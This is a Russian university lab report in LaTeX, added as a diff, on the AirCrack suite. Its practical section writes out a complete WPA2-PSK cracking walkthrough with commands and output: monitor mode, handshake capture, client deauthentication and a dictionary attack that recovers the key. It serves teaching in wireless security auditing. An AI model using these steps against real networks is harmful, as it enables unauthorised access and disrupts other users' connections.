@@ -1,1 +1,242 @@
+\documentclass[10pt,a4paper,titlepage]{article}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage[OT1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage[russian]{babel}
+\usepackage{listings}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\hypersetup{
+    colorlinks,
+    citecolor=black,
+    filecolor=black,
+    linkcolor=black,
+    urlcolor=blue
+}
+\begin{document}
 
+%--titlepage-----
+\begin{titlepage}
+  \begin{center}
+    \large
+    \textbf{Федеральное государственное автономное образовательное учреждение\\
+    Высшего профессионального образования}
+
+    \vspace{0.25cm}
+
+    Санкт-Петербургский политехнический университет
+    \vspace{0.25cm}
+    
+    Институт компьютерных наук и технологий
+    \vspace{0.25cm}
+    
+    Кафедра компьютерных систем и программных технологий
+    \vfill
+
+    \textbf{\textsc{Лабораторная работа №5}}\\[5mm]
+    
+    {\LARGE Набор инструментов для аудита беспроводных сетей AirCrack}
+  \bigskip
+    
+\end{center}
+\vfill
+
+\newlength{\ML}
+\settowidth{\ML}{«\underline{\hspace{0.7cm}}» \underline{\hspace{2cm}}}
+\hfill\begin{minipage}{0.4\textwidth}
+  Выполнил студент\\ группы 53501/3\\
+  \underline{\hspace{\ML}} П.\,П.~Жук\\
+  «\underline{\hspace{0.7cm}}» \underline{\hspace{2cm}} 2016 г.
+\end{minipage}%
+\bigskip
+
+\hfill\begin{minipage}{0.4\textwidth}
+  Проверил преподаватель\\
+  \underline{\hspace{\ML}}\\ К.\,Д.~Вылегжанина\\
+  «\underline{\hspace{0.7cm}}» \underline{\hspace{2cm}} 2016 г.
+\end{minipage}%
+\vfill
+
+\begin{center}
+  Санкт-Петербург\\ 2016 г.
+\end{center}
+\end{titlepage}
+%---------------
+
+\tableofcontents
+\newpage
+
+\section{Цель работы}
+Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2, PSK и WEP.
+
+\section{Задание}
+\begin{enumerate}
+	\item Изучить
+	
+\begin{enumerate}
+	\item Изучить документацию по основным утилитам пакета - airmon-ng, airodump-ng, aireplay-ng, airckrack-ng.
+    \item Запустить режим мониторинга на беспроводном интерфейсе.
+    \item Запустить утилиту airodump, изучить формат вывода этой утилиты, форматы файлов, коорые она может создавать.
+\end{enumerate}
+
+    \item Практическое задание: Проделать следующие действия по взлому WPA2 PSK сети:
+    
+\begin{enumerate}
+    \item Запустить режим мониторинга на беспроводном интерфейсе
+    \item Запустить сбор трафика для получения аутентификационных сообщений
+   	\item Провести деаутентификацию одного из клиентов, до тех пор, пока не удастся собрать необходимых для взлома аутентификационных сообщений
+    \item Провести взлом, используя словарь паролей
+\end{enumerate}
+
+
+\end{enumerate}
+
+\section{Ход работы}
+\subsection{Изучить}
+\subsubsection{Изучить документацию по основным утилитам пакета - airmon-ng, airodump-ng, aireplay-ng, airckrack-ng}
+
+Пакет \textbf{airmon-ng} используется для включения режима мониторинга беспроводных интерфейсов.  
+
+Использование:
+\begin{verbatim}
+ airmon-ng <start|stop> <interface> or airmon-ng <check|check kill>
+\end{verbatim}
+где
+\begin{itemize}
+\item <start|stop> запуск или остановка мониторинга интерфейса
+\item <interface> сам интерфейс
+\item <check|check kill> “check” отображает процессы, мешающие работе AirCrack. Рекомендуется завершить такие процессы перед началом работы с AirCrack. Это можно сделать с помощью “check kill”.
+\end{itemize} 
+
+Пакет \textbf{airodump-ng} используется для захвата пакетов протокола 802.11, а также для получения векторов инициализации (IV) для WEP. \textbf{airodump-ng} также записывает некоторую информацию о всех найденных точках досутпа в несколько файлов.
+Использование:
+\begin{verbatim}
+airodump-ng <options> <interface>[,<interface>,...]
+\end{verbatim}
+Интерфейсы можно получить, предварительно запустив airmon-ng. Доступные опции можно посмотреть \href{http://www.aircrack-ng.org/doku.php?id=airodump-ng}{в документации}.\\
+
+
+Пакет \textbf{aireplay-ng} используется для вставки кадров, используемых затем в aircrack-ng для взлома ключей WEP и WPA-PSK и проведения атак. Кадры для инъекции можно создавать с помощью инструмента packetforge-ng.
+
+Использование:   
+\begin{verbatim}
+aireplay-ng <options> <replay interface>
+\end{verbatim}
+Используемые опции делятся не опции фильтрации пакетов, опции вставки пакетов и некоторые другие типы опций. \textbf{aireplay-ng} Поддерживает несколько видов атак и важно то, что не все опции поддерживаются всеми видами атак. Подробнее про виды атак и опции можно посмотреть \href{http://www.aircrack-ng.org/doku.php?id=aireplay-ng}{в документации}.\\
+
+Пакет \textbf{aircrack-ng} используется для взлома ключей 802.11 WEP и WPA/WPA2-PSK. aircrack-ng может восстановить ключ WEP после того, как airodump-ng захватит достаточное количестсво пакетов. 
+
+Используется два метода: PTW и FMS/KoreK. Первый сначала использует ARP пакеты, а затем все пойманные. Второй использует различные статистические атаки. Тажке существует метод словаря для определения WEP ключа. Для взлома ключа WPA / WPA2 используется только метод словаря.
+Использование: 
+\begin{verbatim}
+aircrack-ng [options] <capture file(s)>
+\end{verbatim}
+
+\subsubsection{Запустить режим мониторинга на беспроводном интерфейсе}
+Для запуска воспользуемся командой airmon-ng start wlan0.
+\begin{verbatim}
+ root@kali:~# airmon-ng start wlan0
+
+Interface	Chipset		Driver
+
+mon0		Atheros 	ath9k - [phy0]
+wlan0		Atheros 	ath9k - [phy0]
+				(monitor mode enabled on mon1)
+\end{verbatim}
+\subsubsection{Запустить утилиту airodump, изучить формат вывода этой утилиты, форматы файлов, коорые она может создавать}
+Возможные форматы вывода утилиты задаются опцией  --output-format <formats>. Возможные значения: pcap, ivs, csv, gps, kismet, netxml. Может быть задано несколько через запятую, в этом случае каждаму указанному типу будет соответствовать файл. Форматы определяет в каком виде будет записана информация о перехваченных пакетах.
+
+С помощью ключа --write (-w) задается префикс файлов.
+
+\subsection{Практическое задание: Проделать следующие действия по взлому WPA2 PSK сети}
+
+\subsubsection{Запустить режим мониторинга на беспроводном интерфейсе}
+\begin{verbatim}
+ root@kali:~# airmon-ng start wlan0
+
+Interface	Chipset		Driver
+
+mon0		Atheros 	ath9k - [phy0]
+wlan0		Atheros 	ath9k - [phy0]
+				(monitor mode enabled on mon1)
+\end{verbatim}
+\subsubsection{Запустить сбор трафика для получения аутентификационных сообщений}
+Просмотрим доступные сети и определим необходимую.
+\begin{verbatim}
+ root@kali:~# airodump-ng mon1
+
+ CH 3 ][ Elapsed: 13 s ][ 2016-06-18 16:27                                         
+                                                                                                                      
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                       
+                                                                                                                      
+ 8D:F6:B2:90:53:F7    0        2        1    0   3  54e  WPA2 CCMP   PSK  DIR-300                                       
+ 5D:6E:A7:49:7B:83    0        6        0    0   4  54e. WPA2 CCMP   PSK  Zhuki
+ F4:B5:9A:F3:E7:E7    0        6        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_6831                                     
+ BB:00:5B:EF:EF:55    0        8        0    0   5  54e  WPA2 CCMP   PSK  dlink                                          
+ AC:22:0B:54:D5:A8    0        2        2    0  13  54e  WPA2 CCMP   PSK  PeterStar-Dlink                                         
+ 7C:33:65:65:B5:B0    0        6        1    0   9  54e  WPA2 CCMP   PSK  house_net                                    
+ EA:9A:F2:D7:EF:12    0        1        0    0  13  54e  WPA2 CCMP   PSK  inet 
+ \end{verbatim}
+ 
+Для сбора данных выбираем сеть:
+\begin{verbatim}
+ 5D:6E:A7:49:7B:83    0        6        0    0   4  54e. WPA2 CCMP   PSK  Zhuki                                       
+ \end{verbatim}
+ 
+Для сбора трафика и получения аутентификационных сообщений запустим команду, приведенную ниже:
+\begin{verbatim}
+ root@kali:~# airodump-ng mon1 --write dump --bssid 5D:6E:A7:49:7B:83 -c 4 
+ CH  4 ][ Elapsed: 18 s ][ 2016-06-18 16:43                                         
+                                                                                                                      
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                   
+                                                                                                                      
+ 5D:6E:A7:49:7B:83    0 100      198      345    0   4  54e. WPA2 CCMP   PSK  Zhuki                                     
+                                                                                                                      
+ BSSID              STATION            PWR   Rate    Lost   Frames  Probe                                            
+                                                                                                                                                                                                
+ 5D:6E:A7:49:7B:83  17:16:49:75:DB:CF    0    0e- 0     2     1693                                                                     
+\end{verbatim}
+
+Видно, что к сети подключен клиент а MAC-адресом 17:16:49:75:DB:CF.
+
+\subsubsection{Провести деаутентификацию одного из клиентов, до тех пор, пока не удастся собрать необходимых для взлома аутентификационных сообщений}
+
+Проведем деаутентификацию указанного выше(17:16:49:75:DB:CF) клиента.
+\begin{verbatim}
+ root@kali:~# aireplay-ng -0 1 -a 5D:6E:A7:49:7B:83 -c 17:16:49:75:DB:CF mon1
+17:01:37  Waiting for beacon frame (BSSID: 5D:6E:A7:49:7B:83) on channel 4
+17:01:38  Sending 64 directed DeAuth. STMAC: [17:16:49:75:DB:CF] [ 42|67 ACKs]
+\end{verbatim}
+
+\subsubsection{Провести взлом, используя словарь паролей}
+Попробуем подобрать пароль по словарю. Выполним следующую команду. 
+\begin{verbatim}                               
+ root@kali:~# aircrack-ng dump*.cap -w pass -b 5D:6E:A7:49:7B:83
+\end{verbatim}
+Здесь dump*.cap - маска для файлом с дампом. pass - файл с паролями для перебора.
+
+В результате получили сообщение об успешно подобранном пароле.
+\begin{verbatim}   
+                   [00:00:00] 1 keys tested (412.29 k/s)
+
+
+                           KEY FOUND! [ password ]
+
+
+      Master Key     : 6D 61 7A F2 08 6F 6C EA A3 E8 4B 9B 43 58 7B 8D 
+                       33 99 1E 17 64 41 A2 2C E3 38 50 81 61 D0 B0 11 
+
+      Transient Key  : 27 03 27 D0 08 6B C0 8A E1 F8 60 89 6D 8E D0 69 
+                       B5 08 FE CE 88 8A D9 DD 84 89 B7 39 AF E2 AF AD
+                       6F 28 51 51 B6 56 7D 0C D2 37 35 EB E1 F9 3D C4 
+                       0E C3 83 47 8F 09 DB 8F 2E 90 63 47 76 DA 89 DA 
+\end{verbatim}
+
+\section{Выводы}
+В ходе данной работы были изучены некоторые из утилит пакета AirCrack, изучены принципы взлома WPA/WPA2 PSK, проведен влом сети при помощи словаря паролей.
+
+С помощью пакета AirCrack можно перехватывать, прослушивать, генерировать пакеты. После прослушивания сеть можно взломать, если пароль сети имеется в используемом словаре паролей.
+
+\end{document}
